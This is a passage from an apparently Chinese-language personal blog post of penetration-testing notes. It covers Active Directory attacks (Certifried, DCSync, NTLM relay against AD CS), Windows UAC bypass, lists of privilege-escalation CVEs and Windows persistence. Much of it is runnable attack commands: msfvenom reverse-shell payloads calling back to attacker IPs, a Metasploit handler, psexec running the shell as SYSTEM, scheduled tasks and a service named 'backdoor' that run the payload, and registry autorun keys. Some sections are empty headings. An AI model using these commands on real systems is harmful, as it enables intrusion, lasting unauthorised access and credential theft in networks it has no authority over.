&#x27;certifriedpc$&#x27;@&lt;domain&gt; -p &#x27;certifriedpass&#x27; -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine</span><br><span class="line"></span><br><span class="line"># 验证证书</span><br><span class="line">certipy auth -pfx thmpc.pfx</span><br></pre></td></tr></table></figure></li><li><p>从AD CS中获取证书，并导出为pfx文件。</p></li><li><p>使用pfx文件进行Kerberos认证，并获取域控制器的票据。</p></li><li><p>使用票据（PTT）执行域内的操作（然后进行DCSYNC抓哈希），例如添加域管理员或执行命令。</p></li><li><p>然后删除账户</p></li></ul><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><ol><li>MSF加载<code>auxiliary/admin/dcerpc/cve_2022_26923_certifried</code>模块</li><li></li></ol><h3 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h3><h2 id="zerologon"><a class="markdownIt-Anchor" href="#zerologon"></a> zeroLogon</h2><h2 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h2><p><a href="https://www.freebuf.com/articles/network/286137.html">DCSync是一种攻击技术，可以模拟域控制器之间的数据同步，从而获取域内用户的哈希</a><a href="https://www.freebuf.com/articles/network/286137.html">1</a><a href="https://cloud.tencent.com/developer/article/1915427">2</a>。要利用DCSync进行横向移动，需要满足以下条件：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1915427">拥有域内管理员权限或者能修改域内普通用户的权限</a><a href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a href="https://cloud.tencent.com/developer/article/1915427">对域对象具备<strong>Replicating Directory Changes All</strong>和<strong>Replicating Directory Changes</strong>两个权限</a><a href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a href="https://www.freebuf.com/articles/network/286137.html">使用Mimikatz或者其他工具发起DCSync请求，导出目标用户的哈希</a><a href="https://www.freebuf.com/articles/network/286137.html">1</a><a href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a href="https://www.cnblogs.com/xiaozi/p/17221077.html">使用哈希传递攻击（Pass the hash）或者其他手法在域内横向移动</a><a href="https://www.cnblogs.com/xiaozi/p/17221077.html">3</a>。</li></ul><h1 id="adcsactive-directory-certificate-service错误配置的相关问题"><a class="markdownIt-Anchor" href="#adcsactive-directory-certificate-service错误配置的相关问题"></a> ADCS(Active Directory Certificate Service)错误配置的相关问题</h1><h2 id="ntlm中继攻击esc8"><a class="markdownIt-Anchor" href="#ntlm中继攻击esc8"></a> NTLM中继攻击（ESC8）</h2><p>进行NTLM Relay攻击有两步：</p><ol><li><p>捕获Net-NTLM Hash</p><p>其还有步骤：</p><ol><li>第一步是需要使目标<a href="https://cloud.tencent.com/product/cvm?from_column=20065&amp;from=20065">服务器</a>向攻击者发起NTLM请求</li><li>第二步是使用工具来捕获服务器发来的NTLM请求</li></ol><p>思路是让受害者把Net-NTLM hash发送给攻击者，也就是说只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试用来向攻击者发送Net-NTLMhash。以下为几种常见的获取方法如下：</p><ol><li>网络协议的欺骗与劫持</li><li>钓鱼攻击</li><li>与其他漏洞结合</li></ol></li><li><p>重放Net-NTLM Hash</p></li></ol><p>NTLM中继已在多种攻击中使用和重用过：</p><p>打印机漏洞：一种从Windows Server触发SMB连接的好方法（与无约束的委托结合起来特别方便）；</p><p>PrivExchange：如何从任何用户的交换邮箱升级到域管理员；</p><p>断开MIC：如何绕过完全保护继电器；</p><p>这些攻击中继了以下协议：</p><p>SMB→SMB（打印机漏洞）</p><p>HTTP→LDAP（PrivExchange）</p><p>SMB→LDAPS（删除MIC）</p><h3 id="工具-2"><a class="markdownIt-Anchor" href="#工具-2"></a> 工具</h3><ol><li><p><a href="https://github.com/lgandx/Responder">responder</a></p></li><li><p><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></p></li></ol><p>ADCS ESC8是一种<strong>利用AD证书服务的Web注册接口进行NTLM中继攻击</strong>的手法，它可以让攻击者<strong>获取域内任意用户的证书</strong>，从而实现<strong>横向移动和提权</strong>。攻击的原理是<strong>Web注册接口默认只允许NTLM身份认证，且没有启用NTLM中继保护</strong>，因此攻击者可以通过中间人的方式截获用户的NTLM哈希，并将其转发给ADCS服务器，申请用户的证书。利用这个漏洞的方法是使用工具如ntlmrelayx.py或者Responder.py来监听和转发NTLM哈希，然后使用certify.exe或者mimikatz.exe来申请和导入证书</p><h2 id="certifriedcve-2022-26923need-adcs-2"><a class="markdownIt-Anchor" href="#certifriedcve-2022-26923need-adcs-2"></a> Certifried(CVE-2022-26923)[NEED ADCS]</h2><h2 id="相关知识-2"><a class="markdownIt-Anchor" href="#相关知识-2"></a> 相关知识</h2><h3 id="lm与ntlm"><a class="markdownIt-Anchor" href="#lm与ntlm"></a> LM与NTLM</h3><p>他们都是Windows对用户的密码凭证进行哈希加密的算法。LM弱点有：</p><ol><li>用户密码转换为大写（不区分大小写），最大长度限制为14个字符</li><li>如果密码强度小于7位，那个第二个分组加密后的结果一定为 <code>aad3b435b51404ee</code></li><li>Des 容易被破解 密码强度不高</li></ol><p>至于NTLM，NTLM Hash 分为 NTLM v / NTLM v2 / NTLM Session v2 三种，NTLMv2安全性要比NTLMv1高一些。</p><ul><li><p>如果获得的是 NTLM v1，就可以直接进行爆破；</p></li><li><p>如果遇到的是NTLM v2，那么就可以尝试使用NTLM Relay攻击。</p><ul><li>如果使用SMB协议就是SMB-relay，使用HTTP就是HTTP-relay</li></ul></li></ul><h1 id="信息搜集-3"><a class="markdownIt-Anchor" href="#信息搜集-3"></a> 信息搜集</h1><p>攻击内网的第一个要点就是攻击网络主机，DMZ区主机，这些主机通常有WEB服务，通过攻击WEB服务，很可能就可以GETSHELL。而内网中的攻击更多是攻击服务组件、端口、版本漏洞等。思路也差不多：</p><h2 id="信息搜集-4"><a class="markdownIt-Anchor" href="#信息搜集-4"></a> 信息搜集</h2><p>包括计划任务、日志（linux命令行、Windows登录成功日志）、补丁（包括版本信息，内核信息）、运行的服务与程序（包括看杀软）、linux提权需要注意的文件、端口信息、凭证信息等等。</p><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>windows计划任务：<code>schtasks /query</code></p><p>linux计划任务存放在几个目录/文件下：</p><ul><li><code>/etc/crontab</code>：存放系统级别的计划任务（不是脚本）。</li><li><code>/var/spoon/cron</code>：存放用户级别的自定义计划任务。</li><li><code>/etc/cron.d/</code>：在这个文件夹中，可以放置以任意名称命名的<strong>cron文件</strong>，每个文件对应一个独立的计划任务。这些cron文件可以包含特定格式的计划任务配置。</li><li><code>crontab</code> 命令：这不是文件夹或文件，而是一个用于管理用户级别cron任务的命令。通过运行 <code>crontab -e</code> 命令，用户可以编辑自己的cron任务。</li><li><code>/etc/cron.&#123;daily, weekly, monthly&#125;/</code>：这些文件夹中存放的是预定义的<strong>cron脚本</strong>，用于执行日常、每周或每月的任务。系统会在预定的时间自动运行这些脚本。</li></ul><h3 id="重要端口"><a class="markdownIt-Anchor" href="#重要端口"></a> 重要端口</h3><p>windows：</p><ul><li>88端口，监听KDC请求，用于Kerberos金银票据的伪造</li><li>135端口：RPC，wmic服务利用</li><li>137、138、139（Samba）端口：NetBios，未授权访问，可以用于发现局域网主机（工具<code>nbtscan</code>）和查看局域网共享资源</li><li>389端口：LDAP</li><li>443端口：HTTPS、Exchange服务（接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 …）</li><li>445端口：smb服务，Windows 协议簇，主要功能为文件共享服务。可以使用IPC连接（<code>net use</code>），可以使用弱口令、远程命令执行</li><li>3389端口：RDP服务，可以安插粘滞键后门（shift）</li><li>5985端口：WinRM服务，可以用来针对某些高版本Windows, 弱口令, 远程执行, 后门植入</li><li>其他的就是</li></ul><p>数据库：</p><ul><li>1433：MSSQL</li><li>1521：ORACLE</li><li>3306：MYSQL</li><li>5432：POSTGESQL</li><li>6379：REDIS</li></ul><h3 id="敏感信息"><a class="markdownIt-Anchor" href="#敏感信息"></a> 敏感信息</h3><h3 id="凭证信息"><a class="markdownIt-Anchor" href="#凭证信息"></a> 凭证信息</h3><h2 id="windows本地提权"><a class="markdownIt-Anchor" href="#windows本地提权"></a> Windows本地提权</h2><p>之前的文章提到，Windows提权主要有</p><ol><li>at、sc计划任务执行命令的提权，这个是早期win的逻辑错误</li><li>服务提权：如果该服务执行的程序路径没有双引号，且有空格，则可以提权；如果该服务路径可以改成自己程序的路径，也行</li><li>dll劫持：查看高权限运行的第三方软件都调用了什么dll（动态调用，一定会调用的），替换之</li><li>然后就是常用的：令牌窃取+烂土豆提权（该用户需要满足模拟令牌的权限）+溢出漏洞</li></ol><p>由于溢出漏洞等等讲得不多，所以多增加一些，加上一些可能会遇到的场景。</p><h3 id="uacbypass"><a class="markdownIt-Anchor" href="#uacbypass"></a> UAC（Bypass）</h3><p>英文名：User Account Control。他有几个档位，中级/高级/默认等等。一旦设置了，那么执行需要管理员权限的操作时，就会弹窗确认。这时候，我们的一些软件，例如Mimikatz就用不了了，所以需要Bypass，达到<code>High Mandatory Level</code>即可。可以手工，也可以使用MSF（里面好多payload）。</p><p>通常，我们可以使用eventvwr.exe程序绕过，该程序允许普通用户以管理员权限运行eventvwr.exe，而无需提供管理员凭据（用于查看系统的事件日志，这也是正常的行为）。该漏洞已经被新版本的Windows修复啦。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164019438.png" alt="image-20230731164019438" style="zoom:50%;" /><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164100532.png" alt="image-20230731164100532" style="zoom: 33%;" /><h4 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h4><p>大概路线：</p><ol><li>创建一个伪装的eventvwr.exe程序，并将其存储在受攻击者控制的目录下，通常是用户目录或可写的临时目录。</li><li>在注册表中创建一个伪装的eventvwr.exe应用程序路径键值，将它指向伪装的eventvwr.exe路径。</li><li>触发eventvwr.exe运行，由于Windows默认会在PATH中查找可执行文件，因此系统将使用注册表中伪装的路径启动eventvwr.exe。</li><li>由于eventvwr.exe是允许以管理员权限运行的程序，因此伪装的eventvwr.exe也会以管理员权限运行，从而绕过了UAC提示。</li><li>通常，配合反弹shell，完成提权</li></ol><p>使用<code>whoami /all</code>查看权限，看是否在管理员用户组中，如果在，并且不是High Mandatory Level，那么就<strong>可能</strong>需要进行Bypass了。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png" alt="OnPaste 20220608-165652" /></p><p>进一步确认是否存在UAC，执行以下命令，如果EnableLUA为0则不需要Bypass，如果为1且<code>PromptSecureDesktop</code>也为1，则可以进行Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System </span><br></pre></td></tr></table></figure><p>查看是否存在eventvwr程序，并且查看是否存在提权条件（<a href="https://github.com/k4sth4/UAC-bypass/blob/main/strings64.exe">string64.exe</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where /r C:\\windows eventvwr.exe</span><br><span class="line">strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure><p>如果存在，则编译exploit，这个程序可以伪造注册表，到我们指定的目录：<a href="https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c%E3%80%82%E4%B8%8A%E4%BC%A0%E8%AF%A5%E8%84%9A%E6%9C%AC%E7%9A%84exe%EF%BC%8C%E8%BF%98%E6%9C%89%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshell.exe%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8C%EF%BC%8C%E8%BF%90%E8%A1%8Cexploit%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c。上传该脚本的exe，还有生成一个shell.exe到服务器里，运行exploit即可。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>当得到High之后，我们可以使用<a href="https://github.com/k4sth4/UAC-bypass/blob/main/psexec64.exe">psexec64</a>提权，接收返回的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe</span><br></pre></td></tr></table></figure><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h4><p>MSF里面有很多工具，我觉得还是得看上面的条件才去使用payload。bypassuac注意需要用户在管理员组，并且uac是开启状态，uac如果是关闭状态是可以直接getsystem进行提权的。</p><p>win7(这个高级用不了，去其他的把）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>win10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure><h4 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h4><p>工具：uacme</p><h3 id="第三方服务"><a class="markdownIt-Anchor" href="#第三方服务"></a> 第三方服务</h3><h4 id="打印机"><a class="markdownIt-Anchor" href="#打印机"></a> 打印机</h4><p><a href="https://github.com/jacob-baines/concealed_position">https://github.com/jacob-baines/concealed_position</a></p><p>通常有：</p><blockquote><p>CVE-2021-35449 - Lexmark 通用打印驱动程序 LPE</p><p>CVE-2021-38085 - 佳能 TR150 打印驱动程序 LPE</p><p>CVE-2019-19363 - Ricoh PCL6 打印驱动程序 LPE</p><p>CVE-2020-1300 - Windows 打印后台处理程序 LPE</p></blockquote><h4 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h4><p>见第一篇</p><h3 id="win漏洞"><a class="markdownIt-Anchor" href="#win漏洞"></a> Win漏洞</h3><p>使用漏洞先要对补丁进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MSF&gt; post/windows/gather/enum_patches # 扫描补丁</span><br><span class="line">MSF&gt; use post/multi/recon/local_exploit_suggester # 列举可用EXP</span><br><span class="line">或</span><br><span class="line">SearchExploit&gt; wmic qfe list full|findstr /i hotfix # 或者 systeminfo</span><br><span class="line">SearchExploit&gt; searchsploit &lt;OS NAME&gt; &lt;OS Version&gt; # 先去expoitDB上查一下</span><br><span class="line">或Empire</span><br><span class="line">Empire&gt; usemodule privesc/watson</span><br><span class="line">Empire&gt; execute</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p><strong>MS08-067</strong></p><p><strong>MS14-058[KB3000061]</strong>：Windows OLE 远程代码执行漏洞，可以用来提权，一般CS用得比较多。</p><p><strong>MS14-068[KB3011780]</strong>：制作金银票据的重要漏洞，可以获取域控ntlm。现在好像很难遇到了。</p><p><strong>MS15-051[KB3045171]</strong>：用得比较多</p><p><strong>MS16-032[KB3124280]</strong></p><p><strong>MS16-075</strong></p><p><strong>MS16-135[KB3199135]</strong></p><p><strong>MS17-010[KB4013389]</strong>：永恒之蓝</p><p><strong>CVE-2018-8120</strong>：MSF常用</p><p><strong>CVE-2019-0708</strong></p><p><strong>CVE-2019-0803</strong></p><p><strong>CVE-2019-1322 &amp; CVE-2019-1405</strong></p><p><strong>CVE-2020-1472</strong>：zeroLOGON，也比较常出现</p></blockquote><h2 id="linux本地提权"><a class="markdownIt-Anchor" href="#linux本地提权"></a> Linux本地提权</h2><h3 id="linux漏洞"><a class="markdownIt-Anchor" href="#linux漏洞"></a> Linux漏洞</h3><p>先检测一下，哪些漏洞可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">https://github.com/PenturaLabs/Linux_Exploit_Suggester</span><br><span class="line">https://github.com/jondonas/linux-exploit-suggester-2</span><br><span class="line">https://github.com/belane/linux-soft-exploit-suggester</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p>CVE-2016-5195：脏牛，<a href="https://github.com/FireFart/dirtycow">参考1</a>，<a href="https://github.com/gbonacini/CVE-2016-5195">参考2</a></p><p>CVE-2017-16995</p><p>CVE-2019-13272</p><p>CVE-2021-4034：<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p>CVE-2021-3560</p><p>CVE-2022-0847</p><p>CVE-2022-23222：<a href="https://github.com/tr3ee/CVE-2022-23222">https://github.com/tr3ee/CVE-2022-23222</a></p></blockquote><h2 id="入口处权限维持"><a class="markdownIt-Anchor" href="#入口处权限维持"></a> 入口处权限维持</h2><p>OWA 登录口 [账号密码,webshell]</p><p>VPN 登录口 [账号密码,shell]</p><p>其他 MAIL 登录口 [账号密码]</p><p>边界 Web服务器 [Webshell 驻留技巧]</p><p>边界路由交换设备 [账号密码,shell]</p><h2 id="windows权限维持"><a class="markdownIt-Anchor" href="#windows权限维持"></a> Windows权限维持</h2><h3 id="系统计划任务-高权限低权限"><a class="markdownIt-Anchor" href="#系统计划任务-高权限低权限"></a> 系统计划任务 [高权限/低权限]</h3><p>可以使用两个指令去完成，<code>at</code>和<code>schtasks</code>，对应不同的版本。之前的文章也说过该方法，所以这里简略再说一下。</p><p>首先确认计划任务服务开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start &quot;task scheduler&quot;</span><br></pre></td></tr></table></figure><p><code>ru</code>是以什么权限运行，如果不行，那么就去掉，参考<a href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create">链接</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># at指令示例</span><br><span class="line">at 15:00 cmd /c copy C:\Users\gang\Desktop\1.txt E:\</span><br><span class="line"></span><br><span class="line">schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件命令&quot; /sc 任务类型 /mo 几分钟运行一次 /ru System</span><br><span class="line"># 示例：每分钟运行一次</span><br><span class="line">schtasks /create /sc minute /mo 1 /tn WScript /tr \\central\data\scripts\sec.vbs /ru System</span><br><span class="line"># 开机运行</span><br><span class="line">SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\AppID\cs /TR C:\artifact.exe</span><br></pre></td></tr></table></figure><p>设置完成后，可以通过<code>schtasks /query</code>查看。然后运行，参考<a href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-run">链接</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn &lt;taskname&gt;</span><br><span class="line"># 示例：运行WScript</span><br><span class="line">schtasks /run /tn WScript</span><br></pre></td></tr></table></figure><h4 id="示例"><a class="markdownIt-Anchor" href="#示例"></a> 示例</h4><ol><li><p>生成木马文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.52.130 lport=3333 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></li><li><p>上传后本机监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.52.130</span><br><span class="line">set LPORT 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>创建任务每分钟运行一次，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc minute /mo 1 /tr C:\Windows\Temp\shell.exe /ru system /f</span><br><span class="line">schtasks run test</span><br></pre></td></tr></table></figure></li></ol><h4 id="服务项"><a class="markdownIt-Anchor" href="#服务项"></a> 服务项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc create “backdoor” binpath= “C:\Users\Administrator\Desktop\shell.exe”</span><br><span class="line"># sc description &quot;Backdoor&quot; &quot;description&quot;    #设置服务的描述字符串</span><br><span class="line">sc config &quot;backdoor&quot; start= auto             #设置这个服务为自动启动</span><br><span class="line">net start &quot;backdoor&quot;                               #启动服务</span><br></pre></td></tr></table></figure><h3 id="常规注册表自启动项-用户权限system权限"><a class="markdownIt-Anchor" href="#常规注册表自启动项-用户权限system权限"></a> 常规注册表自启动项 [用户权限/system权限]</h3><h4 id="自启动文件夹"><a class="markdownIt-Anchor" href="#自启动文件夹"></a> 自启动文件夹</h4><p>启动文件夹利用思路较为简单，即将Payload文件放在启动文件夹，再利用文件隐藏技巧对Payload进行隐藏</p><blockquote><p>#系统级自启动文件夹，需要System权限才能操作</p><p><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></p><p>#用户级自启动文件夹，文件夹所属用户登录可以操作</p><p><code>C:\Users\$&#123;用户名&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p></blockquote><p><strong>利用方法</strong></p><ol><li><p>将文件移植文件夹</p></li><li><p>对文件进行隐藏处理,如利用<code>attrib</code>为文件进行隐藏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib -S -A -H -R test.txt</span><br></pre></td></tr></table></figure></li></ol><h4 id="自启动项"><a class="markdownIt-Anchor" href="#自启动项"></a> 自启动项</h4><p>一种是重启电脑时自启动后门程序实现权限维持；另一种是点击某应用、服务、程序时自启动后门程序实现权限维持。开始菜单是Windows计算机在启动时都会访问到的路径，开始菜单启动项指示了启动文件夹的位置，具体位置如下：</p><blockquote><p>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup</p></blockquote><p>相关键值：</p><blockquote><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User  Shell Folders</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell  Folders</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell  Folders</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User  Shell Folders</p></blockquote><h4 id="注册表"><a class="markdownIt-Anchor" href="#注册表"></a> 注册表</h4><p>Windows在注册表中提供了两套独立的路径，一个是上面提到的当前用户的<code>HKEY_CURRENT_USER</code>即<code>HKCU</code>，另一个就是针对当前用户物理状态的<code>HKEY_LOCAL_MACHINE</code>即<code>HKLM</code>，仅有特权账户可以对其进行修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1.Load注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load</span><br><span class="line"></span><br><span class="line">2.Userinit注册键</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit</span><br><span class="line"># 通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。</span><br><span class="line"></span><br><span class="line">3.Explorer＼Run注册键</span><br><span class="line">Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run</span><br><span class="line"># Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line"></span><br><span class="line">4.RunServicesOnce注册键</span><br><span class="line"># RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce</span><br><span class="line"></span><br><span class="line">5.RunServices注册键</span><br><span class="line"># RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices</span><br><span class="line"></span><br><span class="line">6.RunOnce＼Setup注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup</span><br><span class="line"></span><br><span class="line">7.RunOnce注册键</span><br><span class="line"># 安装程序通常用RunOnce键自动运行程序，它的位置在</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce</span><br><span class="line">[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。</span><br><span class="line"></span><br><span class="line">8.Run注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run</span><br><span class="line"># Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。</span><br></pre></td></tr></table></figure><h3 id="mssql存储过程-继承服务权限"><a class="markdownIt-Anchor" href="#mssql存储过程-继承服务权限"></a> Mssql存储过程 [继承服务权限]</h3><ol><li>使用xp_cmdshell</li><li>使用<a 